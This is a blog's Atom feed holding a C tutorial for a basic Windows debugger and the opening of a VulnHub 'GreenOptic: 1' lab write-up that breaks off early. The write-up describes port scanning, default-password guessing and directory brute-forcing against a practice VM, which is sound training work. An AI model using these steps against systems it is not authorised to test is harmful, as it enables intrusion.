<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-07-23T18:56:17-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Nihaal Prasad</title><subtitle></subtitle><entry><title type="html">Creating a Barebones Windows Debugger</title><link href="http://localhost:4000/2020/03/27/creating-a-barebones-windows-debugger.html" rel="alternate" type="text/html" title="Creating a Barebones Windows Debugger" /><published>2020-03-27T00:00:00-04:00</published><updated>2020-03-27T00:00:00-04:00</updated><id>http://localhost:4000/2020/03/27/creating-a-barebones-windows-debugger</id><content type="html" xml:base="http://localhost:4000/2020/03/27/creating-a-barebones-windows-debugger.html">&lt;p&gt;Today, I will be showing how I created a basic debugger in C for Windows programs. This will be very similar to the &lt;a href=&quot;https://nihaal-prasad.github.io/2020/03/07/creating-a-barebones-linux-debugger.html&quot;&gt;Linux Debugger&lt;/a&gt; that I made a while back, but will be quite different because I will be using the Windows debugging API as opposed to the Linux one.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;static PROCESS_INFORMATION pi = {0}; // Contains information about the debugged process
static int dwContinueStatus = DBG_CONTINUE; // The status for continuing execution
static char cont = 1; // This is set to 0 when the debugger exits

int main(int argc, char** argv) {
    // Initialize some variables
    STARTUPINFO si; // Contains startup information about the debugged process
    ZeroMemory(&amp;amp;si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&amp;amp;pi, sizeof(pi));

    // Create the process to debug
    CreateProcessA(argv[1], NULL, NULL, NULL, 0, DEBUG_ONLY_THIS_PROCESS, NULL, NULL, &amp;amp;si, &amp;amp;pi);

    // Process debugging events
    DEBUG_EVENT debug_event = {0};
    while(cont) {
        if(!WaitForDebugEvent(&amp;amp;debug_event, INFINITE)) {
            break; // Break the loop if the function fails
        }
        ProcessDebugEvent(debug_event); // User-defined function that will process the event
        ContinueDebugEvent(debug_event.dwProcessId, debug_event.dwThreadId, dwContinueStatus); // Continue execution
    }

    // Exit the debugger
    printf(&quot;Debugger will now exit.\n&quot;);
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The first thing that we need to do is create our main() function, which will create a new child process for debugging. We will do this by using the &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa&quot;&gt;CreateProcessA()&lt;/a&gt; function, which will allow us to create a process for the program that we wish to debug. This function requires us to pass in two pointers: one pointing to a &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa&quot;&gt;STARTUPINFO struct&lt;/a&gt; and another pointing to a &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information&quot;&gt;PROCESS_INFORMATION struct&lt;/a&gt;. Note that the PROCESS_INFORMATION variable is a global variable because we will be using the values in it inside of other functions. The CreateProcessA() function will fill up these two structs with information about the process that we just created.&lt;/p&gt;

&lt;p&gt;Our actual debugger will be executed inside of a while loop, and a global variable called “cont” (one by default) will be set to zero whenever we want to stop the debugger. Whenever certain types of events occurs (such as hitting a breakpoint, for example), the child process pauses execution and notifies the debugger that something called a &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/debug/debugging-events&quot;&gt;debugging event&lt;/a&gt; has occurred. Our debugger must continuously wait for debugging events to occur by using the &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-waitfordebugevent&quot;&gt;WaitForDebugEvent()&lt;/a&gt; function so that we can take the appropriate action. Note that the WaitForDebugEvent() function returns zero if some kind of error occurs, in which case, we will immidiately stop the debugger. We are required to pass in a pointer to a &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/minwinbase/ns-minwinbase-debug_event&quot;&gt;DEBUG_EVENT&lt;/a&gt; struct to the WaitForDebugEvent() function, which will automatically fill up the struct with information about the debugging event.&lt;/p&gt;

&lt;p&gt;Once some debug event occurs, we will process the event by using the user-defined function ProcessDebugEvent(), whose code I will show a little further below. This function will select the appropriate action for a particular debug event (such as dealing with an exception). After we have finished processing the debugger, we will then continue the debuggee’s execution by calling &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-continuedebugevent&quot;&gt;ContinueDebugEvent()&lt;/a&gt;, which is equivalent to using the “continue” command in GDB. The dwContinueStatus variable contains information for how we should be continuing execution, and it should be changed to DBG_EXCEPTION_NOT_HANDLED when we are dealing with breakpoints (more on this later).&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;typedef struct _DEBUG_EVENT {
  DWORD dwDebugEventCode;
  DWORD dwProcessId;
  DWORD dwThreadId;
  union {
    EXCEPTION_DEBUG_INFO      Exception;
    CREATE_THREAD_DEBUG_INFO  CreateThread;
    CREATE_PROCESS_DEBUG_INFO CreateProcessInfo;
    EXIT_THREAD_DEBUG_INFO    ExitThread;
    EXIT_PROCESS_DEBUG_INFO   ExitProcess;
    LOAD_DLL_DEBUG_INFO       LoadDll;
    UNLOAD_DLL_DEBUG_INFO     UnloadDll;
    OUTPUT_DEBUG_STRING_INFO  DebugString;
    RIP_INFO                  RipInfo;
  } u;
} DEBUG_EVENT, *LPDEBUG_EVENT;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Before I show you the code for ProcessDebugEvent(), I need to explain how DEBUG_EVENT stores information. Essentially, there is a value inside of the struct called dwDebugEventCode, which contains a number indicating what kind of debugging event happened. The union variable u will then be filled up with the appropriate information relative for each kind of debug event (for example, if an exception occurs, then we could access information about the exception by using debug_event.u.Exception). This makes it easy for us to figure out what the correct action to take is when we receive a debugging event when dealing with it inside of ProcessDebugEvent().&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;void ProcessDebugEvent(DEBUG_EVENT debug_event) {
    // Reset the continue status (in case it was changed while processing an exception)
    dwContinueStatus = DBG_CONTINUE;

    // Call the correct function depending on what the event code is
    switch(debug_event.dwDebugEventCode) {
        case CREATE_PROCESS_DEBUG_EVENT: // Called when the debuggee process is first created
            ProcessCreation(debug_event);
            break;
        case OUTPUT_DEBUG_STRING_EVENT: // Called when a string is sent to the debugger for display
            OutputString(debug_event);
            break;
        case EXCEPTION_DEBUG_EVENT: // Called whenever any exception occurs in the process being debugged
            ProcessException(debug_event);
            break;
        case EXIT_PROCESS_DEBUG_EVENT: // Called when the debuggee process exits
            ExitDebuggeeProcess(debug_event);
            break;
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As you can see here, there are four main debugging events that we will be dealing with (there are more, but these are the only ones we need for creating a basic debugger). Each of these events will call a different user-defined function, which will take appropriate action for dealing with that case. I will start by explaining the simplest one, which is the ExitDebuggeeProcess() function.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// Called when the debuggee exits
void ExitDebuggeeProcess(DEBUG_EVENT debug_event) {
    printf(&quot;Process exited with code %d (0x%x).\n&quot;, debug_event.u.ExitProcess.dwExitCode, debug_event.u.ExitProcess.dwExitCode);
    cont = 0; // Stop the debugger
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The function is called whenever we receive an EXIT_PROCESS_DEBUG_EVENT, which as you can probably guess by the name, indicates that the debuggee has exited. The function code is simple: we just tell the user what the exit code is (both in decimal and in hex), and then we set cont to zero, which will stop the while loop that we had created in main.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// Allocates memory on the heap
void *mymalloc(int size) {
    void *mem = malloc(size);
    if(mem == NULL) {
        printf(&quot;Error allocating memory on the heap.&quot;);
        exit(0);
    }
    return mem;
}

// Called when the debuggee outputs a debug string
void OutputString(DEBUG_EVENT debug_event) {
    // Obtains information (including a pointer) about the string being printed
    // Note that this pointer is only valid on the debuggee's process, but not on the debugger's process
    // So we'll have to read from the debuggee's process and copy that string's value into a string in our process
    OUTPUT_DEBUG_STRING_INFO DebugString = debug_event.u.DebugString;

    // Create space on the heap to store the string being printed
    char* str = mymalloc(DebugString.nDebugStringLength);

    // Read the string from the debuggee's memory and print it
    ReadProcessMemory(pi.hProcess, DebugString.lpDebugStringData, str, DebugString.nDebugStringLength, NULL);
    printf(&quot;Debug String Received: %s\n&quot;, str);

    // Free the heap
    free(str);
    str = NULL;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The other simple function is executed when we receive OUTPUT_DEBUG_STRING_EVENT, which is thrown if the debuggee process sends the debugger process a debug string. This can happen if the debuggee calls a function such as &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-outputdebugstringa&quot;&gt;OutputDebugStringA()&lt;/a&gt;, which will indicate to the system that the debuggee wants to send a string to the debugger. This debug event will set debug_event.u.DebugString equal to a pointer to the string that needs to be printed out. There is one problem with this pointer: it points to a memory address that is on another process and therefore won’t directly work as a string. We can deal with this problem by using the &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory&quot;&gt;ReadProcessMemory()&lt;/a&gt; function, which allows us to copy bytes from another process into an array in our process. From there, it is easy to just print out the string that was received and move on.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;static CREATE_PROCESS_DEBUG_INFO pInfo = {0}; // Contains information about the process creation

// Called when the debuggee process is being created
void ProcessCreation(DEBUG_EVENT debug_event) {
    // Obtain information about the process's creation
    pInfo = debug_event.u.CreateProcessInfo;

    // Add a breakpoint at the start address
    printf(&quot;Setting a breakpoint at the start address...\n&quot;);
    AddBreakpoint(pInfo.lpStartAddress);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The ProcessCreation() function is called when we receive a CREATE_PROCESS_DEBUG_EVENT, which is always received by the debugger right before the debuggee first begins execution. The &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/minwinbase/ns-minwinbase-create_process_debug_info&quot;&gt;CREATE_PROCESS_DEBUG_INFO struct&lt;/a&gt; will contain important information about the process that we will need to access later. This information is given to us via debug_event.u.CreateProcessInfo. One of the pieces of data that the CREATE_PROCESS_DEBUG_INFO struct will contain is the start address of the program. It is vital for us to set a breakpoint at the start address so that the person using the debugger can run commands at that point. Note that the start address of a program is not necessarily the first line of code the debuggee process will execute; there is usually some overhead code that is executed even before we get to start executing the start address.&lt;/p&gt;

&lt;p&gt;Before I show you the code for AddBreakpoint(), I need to show you the basic idea behind setting breakpoints. The “INT 3” assembly instruction (0xCC in hex) will generate a system interrupt that will tell the operating system that a debugging event has occurred. More specifically, once a process reads the instruction 0xCC, it will tell the debugger that an exception has occurred, and the debug event associated with that exception will indicate to the debugger that we have hit a breakpoint. These are the steps that we need to do in order to setup a breakpoint:&lt;/p&gt;
&lt;ol&gt;
    &lt;li&gt;Figure out which line we want to set the breakpoint.&lt;/li&gt;
    &lt;li&gt;Read the first byte at the address where we want to set the breakpoint.&lt;/li&gt;
    &lt;li&gt;Store the address of the line and the original value of the first byte in a linked list.&lt;/li&gt;
    &lt;li&gt;Replace the first byte of the address where we want to set the breakpoint with 0xCC.&lt;/li&gt;
    &lt;li&gt;Continue execution and wait until the debuggee has hit the breakpoint.&lt;/li&gt;
    &lt;li&gt;Push RIP backwards by one byte (RIP would have moved forward as soon as it read INT 3).&lt;/li&gt;
    &lt;li&gt;Search the linked list until we find a node with its address equal to RIP and obtain the original value of the first byte.&lt;/li&gt;
    &lt;li&gt;Delete the node from the linked list.&lt;/li&gt;
    &lt;li&gt;Change the first byte of the address back to its original value (which would've been saved in the linked list).&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Make sure you understand these steps before moving on.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// Contains information for a single breakpoint (used as a linked list)
typedef struct _breakpoint {
    char byte; // Contains the byte that will be overwritten with INT 3
    struct _breakpoint *next; // Contains the next value in the linked list
    void *addr; // Contains the address that the breakpoint is at
} Breakpoint;
static Breakpoint *head = NULL; // Head of the linked list of breakpoints

// Adds a breakpoint to the linked list of breakpoints
void AddBreakpoint(void *addr) {
    // Create space on the heap for this breakpoint
    Breakpoint *b = mymalloc(sizeof(Breakpoint));
    b-&amp;gt;addr = addr;

    // Get the byte that we want to replace with INT 3 and store it in b.byte
    ReadProcessMemory(pInfo.hProcess, addr, &amp;amp;(b-&amp;gt;byte), 1, NULL);

    // Insert an INT 3 (0xCC) instruction
    char byte = 0xCC;
    WriteProcessMemory(pInfo.hProcess, addr, &amp;amp;byte, 1, NULL);
    FlushInstructionCache(pInfo.hProcess, addr, 1);

    // Insert this into the linked list
    b-&amp;gt;next = head;
    head = b;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Our struct for breakpoints needs to store three values: the original value of the byte that will be overwritten with INT 3, the next value in the linked list, and the address of the breakpoint. The AddBreakpoint() function is used to deal with steps one through four. It starts off by allocating memory for the breakpoint and saving the address of that breakpoint. We then use ReadProcessMemory() to store the value of the very first byte into b-&amp;gt;byte. Then we use &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory&quot;&gt;WriteProcessMemory()&lt;/a&gt; to overwrite the byte that we just read with INT 3. Because it is possible that the CPU has already started to load the next instruction, we must call &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-flushinstructioncache&quot;&gt;FlushInstructionCache()&lt;/a&gt; to ensure that our changes are made. Finally, we add this breakpoint to the linked list.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// Called when the debuggee receives an exception
void ProcessException(DEBUG_EVENT debug_event) {
    // Look at the status for the exception
    int code = debug_event.u.Exception.ExceptionRecord.ExceptionCode;
    switch(code) {
        case STATUS_BREAKPOINT: // Called when the exception was caused by a breakpoint
            ProcessBreakpoint(debug_event);
            break;
        default:
            printf(&quot;Exception %d (0x%x) received.\n&quot;, code, code);
            ProcessCommands(); // Allow the user to type in commands into the debugger
            break;    
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Our next function, ProcessException(), is used to deal with step five, and it is called whenever EXCEPTION_DEBUG_EVENT is received. If the exception code for the exception indicates that we have hit a breakpoint, then we will call ProcessBreakpoint() to deal with this breakpoint. Else, we will just print out the exception number in both decimal and hex. The ProcessCommands() function will be shown a little later, and it will be used to allow the user to type commands into the debugger.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;void ProcessBreakpoint(DEBUG_EVENT debug_event) {
    if(head != NULL) { // Do nothing if the head of the breakpoint linked list is NULL
        // Get the value of RIP
        CONTEXT lcContext;
        lcContext.ContextFlags = CONTEXT_ALL;
        GetThreadContext(pInfo.hThread, &amp;amp;lcContext); // Obtains the thread context (which contains info about registers)
        lcContext.Rip--; // Move RIP back one byte (RIP would've moved forward as soon as it read INT 3)

        // Find the breakpoint in the linked list, obtain the byte that was originally there and its address, and delete the node from the linked list
        char byte = 0;
        void *addr = NULL;
        char found = 1; // This is set to zero if we did not find the correct byte
        if(head-&amp;gt;addr == (void *) lcContext.Rip) { // Triggered if the head is the breakpoint we're looking for
            byte = head-&amp;gt;byte; // Save the byte
            addr = head-&amp;gt;addr; // Save the address

            // Delete the head
            Breakpoint *del = head;
            head = head-&amp;gt;next;
            free(del);
        } else { // Else, loop until we find the correct breakpoint
            Breakpoint *b = head;
            while(b-&amp;gt;next != NULL &amp;amp;&amp;amp; b-&amp;gt;next-&amp;gt;addr != (void *) lcContext.Rip) {
                b = b-&amp;gt;next;
            }
            if(b-&amp;gt;next != NULL) {
                byte = b-&amp;gt;next-&amp;gt;byte; // Save the byte
                addr = b-&amp;gt;next-&amp;gt;addr; // Save the address

                // delete the correct node
                Breakpoint *del = b-&amp;gt;next;
                b-&amp;gt;next = del-&amp;gt;next;
                free(del);
            } else { // If this else statement hits, then we did not find the breakpoint in the linked list, and we will just ignore it
                found = 0;
            }
        }
        if(found) {
            // Indicate that we have hit a breakpoint
            dwContinueStatus = DBG_EXCEPTION_NOT_HANDLED; // The debuggee should not handle this exception
            printf(&quot;Hit a breakpoint!\n&quot;);

            // Apply the change to RIP (which was moved one byte backwards earlier)
            SetThreadContext(pInfo.hThread, &amp;amp;lcContext);

            // Replace the INT 3 instruction with the byte that was originally there
            WriteProcessMemory(pInfo.hProcess, addr, &amp;amp;byte, 1, NULL);
            FlushInstructionCache(pInfo.hProcess, addr, 1);

            // Allow the user to type in commands into the debugger
            ProcessCommands();
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This next function is long, but it will allow us to deal with steps six through nine for dealing with breakpoints. First we will check whether the head is NULL, and if it is NULL, then we will do nothing. We must do this check because usually the operating system automatically sets a breakpoint at the start of wherever the process first starts executing (which, by the way, is not necessarily the start address because there is some overhead involved with execution), and we do not want to do anything with this first breakpoint.&lt;/p&gt;

&lt;p&gt;If the check passes, then we will get the value of RIP by using &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext&quot;&gt;GetThreadContext()&lt;/a&gt;, which requires a pointer to a &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-context&quot;&gt;CONTEXT&lt;/a&gt; struct. The CONTEXT struct is used to store information about a thread’s context, and it should contain the values of various registers. Once we obtain Rip from the CONTEXT struct, we must subtract it by one to move it backwards (but we won’t apply these changes to the debuggee until once we are sure that the current address is inside of the breakpoint linked list).&lt;/p&gt;

&lt;p&gt;The next step is to find the node in the linked list that contains an addr value that is equal to the current value of RIP. Once we find the correct node, we will save the value of the original byte, and we will save the value of addr. We can delete the node from the linked list of breakpoints after that. The code for doing this should be simple to understand if you understand how linked lists work.&lt;/p&gt;

&lt;p&gt;If we have found the node in the linked list, then there are a few more steps that we need to take care of. First, we must set dwContinueStatus equal to DBG_EXCEPTION_NOT_HANDLED, which will tell the system that the debuggee should not handle this exception. Next, we have to apply our changes to RIP by calling &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext&quot;&gt;SetThreadContext()&lt;/a&gt; with our modified context as a parameter. We can then replace the INT 3 instruction with the byte that was originally there by using WriteProcessMemory() and FlushInstructionCache(). Finally, we will allow the user to type in commands into the debugger by calling the ProcessCommands() function.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// Allows the user to type in commands into the debugger
void ProcessCommands() {
    char *cmd = mymalloc(200); // The command that the user types in
    while(strncmp(cmd, &quot;continue&quot;, 8) != 0 &amp;amp;&amp;amp; strncmp(cmd, &quot;cont&quot;, 4) != 0) {
        printf(&quot;&amp;gt; &quot;);
        fgets(cmd, 200, stdin); // Read a line

        if(strncmp(cmd, &quot;registers&quot;, 9) == 0 || strncmp(cmd, &quot;regs&quot;, 4) == 0) {
            PrintRegs(); // Prints out all of the values of the registers
        } else if(strncmp(cmd, &quot;break &quot;, 6) == 0 || strncmp(cmd, &quot;b &quot;, 2) == 0) {
            strtok(cmd, &quot; &quot;); // The value after the space should be the address in hex
            AddBreakpoint((void *) strtoll(strtok(NULL, &quot; &quot;), 0, 16)); // Adds a breakpoint at that address
        } else if(strncmp(cmd, &quot;mem &quot;, 4) == 0) {
            strtok(cmd, &quot; &quot;);
            char *a = strtok(NULL, &quot; &quot;); // The value after the first space should be the address in hex
            char *b = strtok(NULL, &quot; &quot;); // The value after the second space should be the number of bytes to read in decimal
            ReadMemory(a, atoi(b)); // Read from the given memory address
        } else if(strncmp(cmd, &quot;quit&quot;, 4) == 0 || strncmp(cmd, &quot;q&quot;, 1) == 0 || strncmp(cmd, &quot;exit&quot;, 4) == 0) {
            printf(&quot;Debugger will now exit.\n&quot;); // Exit the program
            exit(0);
        } else if(strncmp(cmd, &quot;help&quot;, 4) == 0) {
            printf(&quot;continue: Continues execution.\n&quot;);
            printf(&quot;registers: Prints out the values of all of the registers.\n&quot;);
            printf(&quot;break &amp;lt;addr&amp;gt;: Sets a breakpoint at a given address.\n&quot;);
            printf(&quot;mem &amp;lt;addr&amp;gt; &amp;lt;bytes&amp;gt;: Reads a given number of bytes from a given memory address.\n&quot;);
            printf(&quot;quit: Closes the debugger.\n&quot;);
        }
    }
    
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The ProcessCommands() function has six commands: help, continue, registers, break, mem, and quit. The help command shows more details for what each command does and what their parameters are. This function is mainly used to process input that the user types in and select the correct function to call.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// Prints out all of the values of the registers
void PrintRegs() {
    // Read the registers
    CONTEXT lcContext;
    lcContext.ContextFlags = CONTEXT_ALL;
    GetThreadContext(pInfo.hThread, &amp;amp;lcContext);
    
    // Print out all of the values of the registers
    printf(&quot;RAX: 0x%llx\n&quot;, lcContext.Rax);
    printf(&quot;RBX: 0x%llx\n&quot;, lcContext.Rbx);
    printf(&quot;RCX: 0x%llx\n&quot;, lcContext.Rcx);
    printf(&quot;RDX: 0x%llx\n&quot;, lcContext.Rdx);
    printf(&quot;RSP: 0x%llx\n&quot;, lcContext.Rsp);
    printf(&quot;RBP: 0x%llx\n&quot;, lcContext.Rbp);
    printf(&quot;RSI: 0x%llx\n&quot;, lcContext.Rsi);
    printf(&quot;RDI: 0x%llx\n&quot;, lcContext.Rdi);
    printf(&quot;R8: 0x%llx\n&quot;, lcContext.R8);
    printf(&quot;R9: 0x%llx\n&quot;, lcContext.R9);
    printf(&quot;R10: 0x%llx\n&quot;, lcContext.R10);
    printf(&quot;R11: 0x%llx\n&quot;, lcContext.R11);
    printf(&quot;R12: 0x%llx\n&quot;, lcContext.R12);
    printf(&quot;R13: 0x%llx\n&quot;, lcContext.R13);
    printf(&quot;R14: 0x%llx\n&quot;, lcContext.R14);
    printf(&quot;R15: 0x%llx\n&quot;, lcContext.R15);
    printf(&quot;RIP: 0x%llx\n&quot;, lcContext.Rip);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;PrintRegs() is used to print out all of the values of the registers. I had already explained how to read the value of RIP when I went over how ProcessBreakpoint() worked, so reading the values of all of the registers should be pretty self-explanatory by this point.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// Reads n bytes from the given memory address
void ReadMemory(char *addr_hex, int n) {
    // Convert the address from a hex string into a DWORD64
    long long addr = strtoll(addr_hex, 0, 16);
    printf(&quot;Reading memory from address 0x%llx...\n&quot;, addr);

    // Read n bytes from the given memory address
    char *buf = mymalloc(n);
    ReadProcessMemory(pInfo.hProcess, (LPCVOID) addr, buf, n, NULL);

    // Loop through each byte in the buffer and print it out
    for(int i = 0; i &amp;lt; n; i++) {
        printf(&quot;0x%x &quot;, buf[i]);
    }
    printf(&quot;\n&quot;);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The last function that I need to go over is ReadMemory(). I had already gone over how ReadProcessMemory() worked when I went over how OutputString() worked, so this should also be self-explanatory by this point.&lt;/p&gt;

&lt;p&gt;We are finally done building our debugger! You can see the entire code &lt;a href=&quot;https://github.com/nihaal-prasad/Barebones-Windows-Debugger/blob/master/debugger.c&quot;&gt;here&lt;/a&gt; if you want to see it all at once.&lt;/p&gt;

&lt;section class=&quot;related&quot;&gt;
  &lt;h3 style=&quot;color: black&quot;&gt;Related Posts&lt;/h3&gt;
  &lt;ul class=&quot;post-list&quot;&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/03/27/pentesting-greenoptic-1.html&quot;&gt;
          Pentesting GreenOptic: 1
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/03/07/creating-a-barebones-linux-debugger.html&quot;&gt;
          Creating a Barebones Linux Debugger
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/02/27/cracking-Silva97-login-cipher.html&quot;&gt;
          Cracking Silva97's login-cipher
        &lt;/a&gt;
      &lt;/li&gt;
    
  &lt;/ul&gt;
&lt;/section&gt;</content><author><name></name></author><summary type="html">Today, I will be showing how I created a basic debugger in C for Windows programs. This will be very similar to the Linux Debugger that I made a while back, but will be quite different because I will be using the Windows debugging API as opposed to the Linux one.</summary></entry><entry><title type="html">Pentesting GreenOptic: 1</title><link href="http://localhost:4000/2020/03/27/pentesting-greenoptic-1.html" rel="alternate" type="text/html" title="Pentesting GreenOptic: 1" /><published>2020-03-27T00:00:00-04:00</published><updated>2020-03-27T00:00:00-04:00</updated><id>http://localhost:4000/2020/03/27/pentesting-greenoptic-1</id><content type="html" xml:base="http://localhost:4000/2020/03/27/pentesting-greenoptic-1.html">&lt;p&gt;Today, I will be writing up how I solved the &lt;a href=&quot;https://www.vulnhub.com/entry/greenoptic-1,510/#&quot;&gt;GreenOptic: 1&lt;/a&gt; challenge from VulnHub. This was quite a difficult box to do as it led me down a bunch of rabbit-holes, but nonetheless, I was able to solve it. The challenge was designed to be realistic, and all of the things that I came across were things that could be found in a real environment.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image18.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As soon as I downloaded the virtual machine and spun it up in &lt;a href=&quot;https://www.virtualbox.org/&quot;&gt;VirtualBox&lt;/a&gt;, I immediately noticed that the target’s hostname was “websrv01” and it was running CentOS Linux 7. I ran a ping scan in Nmap to find out that the IP address of the virtual machine was 192.168.56.19, and afterwards, I ran an aggressive SYN scan as well (shown below). Ports 21/tcp, 22/tcp, 53/tcp, 80/tcp, and 10000/tcp were open. I tried to login to the FTP server using the anonymous account, but it did not work.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image30.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The webpage running on port 10000 intrigued me because it is typically not a port used for HTTP, so I went ahead and looked at it. There was a login page for &lt;a href=&quot;http://www.webmin.com/&quot;&gt;Webmin&lt;/a&gt;, which is a web-based interface for Unix system administration.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image26.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I tried to use all of the most obvious passwords (such as admin/admin, root/root, etc.), but after I typed in an incorrect password too many times, the server automatically blocked my IP address. This meant that brute forcing the webpage was not an option. Webmin 1.953 is the latest version of Webmin (at the time of writing this), and no known vulnerabilities existed in its environment. After trying a few more different things, I decided that this was probably not the best attack vector, and I moved on.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image22.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There was another basic webpage running on port 80, so I decided to take a look at that as well. At first glance, it did not seem very interesting. However, using gobuster, I was able to brute force some hidden directories in the website, and I found a hidden login page at /account/.&lt;/p&gt;

&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image14.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once again, I tried to use the most obvious passwords, but I had no luck. I moved on and looked more into the website, where I found a directory listing under /img. In the directory listing, I saw two peculiar files: image.dd and testdisk.log. What was a log file and a disk image file doing in a directory filled with pictures?&lt;/p&gt;

